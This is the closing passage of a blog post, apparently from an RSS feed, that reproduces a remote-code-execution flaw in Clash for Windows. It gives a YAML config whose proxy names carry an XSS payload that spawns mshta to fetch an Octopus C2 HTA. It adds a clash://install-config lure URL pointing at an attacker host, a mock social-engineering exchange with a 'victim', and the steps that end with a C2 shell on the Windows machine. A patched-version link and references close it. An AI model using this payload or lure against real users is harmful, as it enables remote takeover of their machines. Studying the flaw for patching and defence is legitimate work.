&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip-cert-verify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;proxy-groups&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;-&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(&amp;#39;require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;mshta&amp;#34;,[&amp;#34;Octopus&amp;#39;s link&amp;#34;])&amp;#39;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;a&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(&amp;#39;require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;mshta&amp;#34;,[&amp;#34;Octopus&amp;#39;s link&amp;#34;])&amp;#39;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;Principle: This is an XSS vulnerability. By inserting the payload into the Proxy&amp;rsquo;s name, arbitrary JS code execution is achieved. Here, it executes the command &lt;code&gt;mshta&lt;/code&gt; with the parameter being the Octopus-generated hta link.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Press &lt;code&gt;Esc&lt;/code&gt; and type &lt;code&gt;:wq&lt;/code&gt; to save and exit.&lt;/p&gt;
&lt;p&gt;Afterward, the attacker can wait for the victim to connect ;)&lt;/p&gt;
&lt;h3 id=&#34;victim-machine&#34;&gt;Victim Machine&lt;/h3&gt;
&lt;p&gt;&lt;del&gt;(evil smirk)&lt;/del&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Simulating social engineering:&lt;/p&gt;
&lt;p&gt;Hacker: &amp;ldquo;Do you want free proxies QAQ???&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Victim: &amp;ldquo;Yes, please.&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Hacker: &amp;ldquo;Here&amp;rsquo;s what you need &lt;code&gt;clash://install-config?url=xxx&amp;amp;name=RCE&lt;/code&gt;&amp;rdquo;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;On any browser in Windows, enter&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;clash://install-config?url=http://Your_Linux_IP/RCE.yaml&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;name=YourName
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Tip: Remember to change the IP and name&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Then, in the pop-up, click &lt;code&gt;Open Clash For Windows&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/2.jpg&#34;
	width=&#34;672&#34;
	height=&#34;232&#34;
	srcset=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/2_hua885acc8b430d11c5301250d668e065f_391390_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/reproducing-clash-rce/2_hua885acc8b430d11c5301250d668e065f_391390_1024x0_resize_q75_box.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Pop-up&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;289&#34;
		data-flex-basis=&#34;695px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Go to the &lt;code&gt;Profiles&lt;/code&gt; page&lt;/p&gt;
&lt;p&gt;Select &lt;code&gt;FileName.yaml&lt;/code&gt; (here it is &lt;code&gt;RCE.yaml&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/3.jpg&#34;
	width=&#34;1695&#34;
	height=&#34;852&#34;
	srcset=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/3_hu8045fe0fc415d8a0347b05d041892f72_86987_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/reproducing-clash-rce/3_hu8045fe0fc415d8a0347b05d041892f72_86987_1024x0_resize_q75_box.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;RCE.yaml (It&amp;rsquo;s suggested to use a different name in real-world scenarios)&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;198&#34;
		data-flex-basis=&#34;477px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Switch to the &lt;code&gt;Proxies&lt;/code&gt; page and click on the &lt;code&gt;a&lt;/code&gt; (this step is optional as this RCE is somewhat unstable)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/4.jpg&#34;
	width=&#34;1594&#34;
	height=&#34;751&#34;
	srcset=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/reproducing-clash-rce/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_1024x0_resize_q75_box.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Well = =&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;212&#34;
		data-flex-basis=&#34;509px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;successful-shell-acquisition&#34;&gt;Successful Shell Acquisition&lt;/h3&gt;
&lt;p&gt;Octopus receives the shell, allowing you to &lt;strong&gt;do whatever you want&lt;/strong&gt; on the unfortunate Windows machine&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/sh.jpg&#34;
	width=&#34;1239&#34;
	height=&#34;667&#34;
	srcset=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_480x0_resize_q75_box.jpg 480w, https://kira-pgr.github.io/p/reproducing-clash-rce/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_1024x0_resize_q75_box.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Watermelon shell&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;185&#34;
		data-flex-basis=&#34;445px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Type &lt;code&gt;interact 1&lt;/code&gt; to execute any cmd command on that Windows machine. QWQ.&lt;/p&gt;
&lt;h2 id=&#34;patch&#34;&gt;Patch&lt;/h2&gt;
&lt;p&gt;The official Clash team has already released a new version fixing the vulnerability&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Fndroid/clash_for_windows_pkg/releases/download/0.19.10/Clash.for.Windows-0.19.10-win.7z&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Download Link&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;ref&#34;&gt;Ref&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Fndroid/clash_for_windows_pkg/issues/2710&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/Fndroid/clash_for_windows_pkg/issues/2710&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://httpd.apache.org/docs/2.4/install.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Compiling and Installing - Apache HTTP Server Version 2.4&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/mhaskar/Octopus/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub - mhaskar/Octopus: Open source pre-operation C2 server based on python and powershell&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Part of translations by &lt;strong&gt;GPT-4&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        
    </channel>
</rss>
